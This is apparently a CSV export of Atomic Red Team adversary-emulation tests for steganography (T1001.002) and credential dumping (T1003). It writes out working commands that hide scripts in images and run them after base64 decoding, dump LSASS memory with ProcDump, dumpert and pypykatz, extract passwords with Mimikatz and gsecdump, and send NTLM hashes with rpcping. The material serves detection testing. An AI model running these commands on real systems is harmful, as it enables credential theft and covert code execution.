"File","AtomicTest","Command","Cleanup"
"C:\AtomicRedTeam\atomics\T1001.002\T1001.002.yaml","Steganographic Tarball Embedding","Get-Content ""#{image_file}"", ""#{tar_file}"" -Encoding byte -ReadCount 0 | Set-Content ""#{new_image_file}"" -Encoding byte
","Set-ExecutionPolicy Bypass -Scope Process -Force -ErrorAction Ignore
Remove-Item -Path ""#{new_image_file}"" -Force -ErrorAction Ignore
"
"C:\AtomicRedTeam\atomics\T1001.002\T1001.002.yaml","Embedded Script in Image Execution via Extract-Invoke-PSImage","cd ""PathToAtomicsFolder\ExternalPayloads\""
Import-Module .\Extract-Invoke-PSImage.ps1
$extractedScript=Extract-Invoke-PSImage -Image ""#{image_file}"" -Out ""$HOME\result.ps1""
$scriptContent = Get-Content ""$HOME\result.ps1"" -Raw
$base64Pattern = ""(?<=^|[^A-Za-z0-9+/])(?:[A-Za-z0-9+/]{4})*(?:[A-Za-z0-9+/]{2}(==)?|[A-Za-z0-9+/]{3}=)?(?=$|[^A-Za-z0-9+/])""
$base64Strings = [regex]::Matches($scriptContent, $base64Pattern) | ForEach-Object { $_.Value }
$base64Strings | Set-Content ""$HOME\decoded.ps1""
$decodedContent = Get-Content ""$HOME\decoded.ps1"" -Raw
$decodedText = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($decodedContent))
$textPattern = '^.+'  
$textMatches = [regex]::Matches($decodedText, $textPattern) | ForEach-Object { $_.Value }
$scriptPath = ""$HOME\textExtraction.ps1""
$textMatches -join '' | Set-Content -Path $scriptPath
. ""$HOME\textExtraction.ps1""
","Set-ExecutionPolicy Bypass -Scope Process -Force -ErrorAction Ignore
Remove-Item -Path ""$HOME\result.ps1"" -Force -ErrorAction Ignore 
Remove-Item -Path ""$HOME\textExtraction.ps1"" -Force -ErrorAction Ignore
Remove-Item -Path ""$HOME\decoded.ps1"" -Force -ErrorAction Ignore        
"
"C:\AtomicRedTeam\atomics\T1001.002\T1001.002.yaml","Execute Embedded Script in Image via Steganography","cat ""#{script}"" | base64 | xxd -p | sed 's/../& /g' | xargs -n1 | xxd -r -p | cat ""#{image}"" - > ""#{evil_image}""; strings ""#{evil_image}"" | tail -n 1 | base64 -d | sh","rm ""#{evil_image}"""
"C:\AtomicRedTeam\atomics\T1003\T1003.yaml","Gsecdump","""#{gsecdump_exe}"" -a
",
"C:\AtomicRedTeam\atomics\T1003\T1003.yaml","Send NTLM Hash with RPC Test Connection","rpcping -s #{server_ip} -e #{custom_port} -a privacy -u NTLM 1>$Null",
"C:\AtomicRedTeam\atomics\T1003.001\T1003.001.yaml","Dump LSASS.exe Memory using ProcDump","""#{procdump_exe}"" -accepteula -ma lsass.exe #{output_file}
","del ""#{output_file}"" >nul 2> nul
"
"C:\AtomicRedTeam\atomics\T1003.001\T1003.001.yaml","Dump LSASS.exe Memory using direct system calls and API unhooking","""#{dumpert_exe}""
","del C:\windows\temp\dumpert.dmp >nul 2> nul
"
"C:\AtomicRedTeam\atomics\T1003.001\T1003.001.yaml","Offline Credential Theft With Mimikatz","""#{mimikatz_exe}"" ""sekurlsa::minidump #{input_file}"" ""sekurlsa::logonpasswords full"" exit
",
"C:\AtomicRedTeam\atomics\T1003.001\T1003.001.yaml","LSASS read with pypykatz","""#{venv_path}\Scripts\pypykatz"" live lsa 
","del ""%temp%\nanodump.dmp"" > nul 2> nul
"
"C:\AtomicRedTeam\atomics\T1003.001\T1003.001.yaml","Create Mini Dump of LSASS.exe using ProcDump","""#{procdump_exe}"" -accepteula -mm lsass.exe #{output_file}
","del ""#{output_file}"" >nul 2> nul
"
